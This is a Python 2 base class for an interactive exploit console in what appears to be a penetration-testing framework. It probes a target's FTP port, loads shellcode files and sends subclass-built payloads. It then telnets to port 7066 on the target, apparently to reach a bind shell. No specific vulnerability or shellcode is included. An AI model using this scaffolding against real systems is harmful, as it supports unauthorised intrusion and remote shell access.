import cmd
class Exploit(cmd.Cmd):
  def __init__(self, name, target, payload, variables, descriptions, check=[False]):
    cmd.Cmd.__init__(self)
    self.prompt = "pdf-console:attack(" + name +")% "
    self.os = __import__("os")
    self.ftplib = __import__("ftplib")
    self.subprocess = __import__("subprocess")
    self.sys = __import__("sys")
    _tmp = __import__("random", globals(), locals(), ['randint', 'choice'])
    self.choice = _tmp.choice
    self.randint = _tmp.randint
    _tmp = __import__("socket", globals(), locals(), ['socket', 'AF_INET', 'SOCK_STREAM', 'gethostbyname'])
    self.socket = _tmp.socket
    self.AF_INET = _tmp.AF_INET
    self.SOCK_STREAM = _tmp.SOCK_STREAM
    self.gethostbyname = _tmp.gethostbyname
    self.config = __import__("config")
    _tmp = __import__("string", globals(), locals(), ['letters'])
    self.letters = _tmp.letters
    self.variables = variables #{"":""}  list of variables
    self.descriptions = descriptions #{"":""} descriptions
    self.name =  name #[""] name of exploit
    self.target = target #[""] target ex: Windows 7 SP1 x86
    self.payload =  payload #[""] name of payload
    self.check = check
    self.banner = [""]
  def rand_text(self, length):
    return "".join( [self.choice(self.letters) for i in xrange(length)] )
  def check_vuln(self):
    print "[+]The host %s is vulnerable!" % self.variables["host"]
  def check_safe(self):
    print "[-]The host %s isn't vulnerable. :(" % self.variables["host"]
  def getToken(self, line):
    token = ""
    for letter in line:
      if letter != " ":
        token += letter
      else:
        break
    return token
  def connect(self):
    s = self.socket(self.AF_INET, self.SOCK_STREAM)
    s.connect((self.variables["host"], 21))
    self.banner[0] = s.recv(1024)
    return s
  def disconnect(self, s):
    s.close()
  def check(self):
    pass #overwrite this
  def rand(self, bytes):
    p = ""
    char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
    for a in range(0, bytes):
      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
      p += tmp.decode('string_escape')
    return p
  def check_host(self):
    for let in "abcdefghijklmnopqrstuvwxyz":
      if let in self.variables["host"]:
        self.variables["host"] = self.gethostbyname(self.variables["host"])
    try:
      self.disconnect(self.connect())
    except:
      print "[-]The host could not be reached."
      return 1
    return 0
  def get_shellcode(self):
    payload = ""
    try:
      f = open(self.config.cwd + "/payloads/" + self.payload, "r")
    except:
      print "[-]File not found: " + self.config.cwd + "/payloads/" + self.payload
      return 1
    for line in f.readlines():
      payload += line[:-1].decode('string_escape')
    f.close()
    return payload
  def generate(self):
    pass #overwrite this
  def deliver(self, payload):
    pass #overwrite this
  def init(self):
    if self.check_host() != 0:
      return 1
    print "[*]Generating payload..."
    payload = ""
    return payload
  def init_deliver(self, payload):
    print "[+]Payload generated."
    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
  def help_help(self):
    print "Usage: help [cmd]"
    print "cmd    the command to get help on"
    print "help: show help on a command or list commands"
  def help_set(self):
    print "Usage: set [var] = [val]"
    print "var    variable to set"
    print "val    value to set variable to"
    print "set: set a variable to a value"
    print "Note: you MUST use it exactly as shown: no set [var]=[val]!"
  def do_set(self, args):
    var = self.getToken(args)
    val = args[len(var) + 3:]
    for variable in self.variables.keys():
      if variable == var:
        self.variables[variable] = val 
      else:
        print "*** Variable not found: %s" % var
        return
    print "[*]%s => %s" % (var, val)
  def help_show(self):
    print "Usage: show options"
    print "show options: show the variables, current values, and descriptions"
  def do_show(self, args):
    if args != "options":
      print "*** Unknown argument: " + args
      return
    print "Target: %s" % self.target
    print "Options for %s:" % self.name
    print "========================"
    for variable in self.variables.keys():
      print "%s    %s    %s" % (variable, self.variables[variable], self.descriptions[variable])
  def help_exit(self):
    print "Usage: exit"
    print "exit: exit the %s context" % self.name
  def do_exit(self, args):
    if args:
      print "*** Argument number: needed 0"
      return
    return True
  def help_check(self):
    print "Usage: check"
    print "check: check if target is vulnerable. Some modules do not support this."
  def do_check(self, args):
    if args:
      print "*** Argument number: needed 0"
      return
    if self.check[0] == False:
      print "[-]This module doesn't support the check function."
    elif self.check[0] == True:
      self.check()
    else:
      print "*** Internal Error: self.check[0] is not set to a boolean value."
  def help_start(self):
    print "Usage: start"
    print "start: start the attack"
  def do_start(self, args):
    if args:
      print "*** Unknown argument: " + args
      return
    for v in self.variables.keys():
      if self.variables[v]:
        pass
      else:
        print "*** Variable not set: " + v
        return
    payload = self.init()
    if payload == 1:
      return
    payload = self.generate(payload)
    if payload == 1:
      return 
    self.deliver(payload)
    print "[+]Payload sent."
    print "[*]Attempting to connect..."
    if self.config.pc == "yes":
      code = self.subprocess.call(["telnet", self.variables["host"], "7066"], stdin=self.sys.stdin, stdout=self.sys.stdout)
      if code != 0:
        print "[-]Host could not be reached. It might be behind a firewall. Or the exploit failed. :("
    else:
      code = self.subprocess.call(["/data/data/com.raveneus.penedroid/files/telnet", self.variables["host"], "7066"], stdin=self.sys.stdin, stdout=self.sys.stdout) 
      if code != 0:
        print "[-]Host could not be reached. It might be behind a firewall. Or the exploit failed. :("
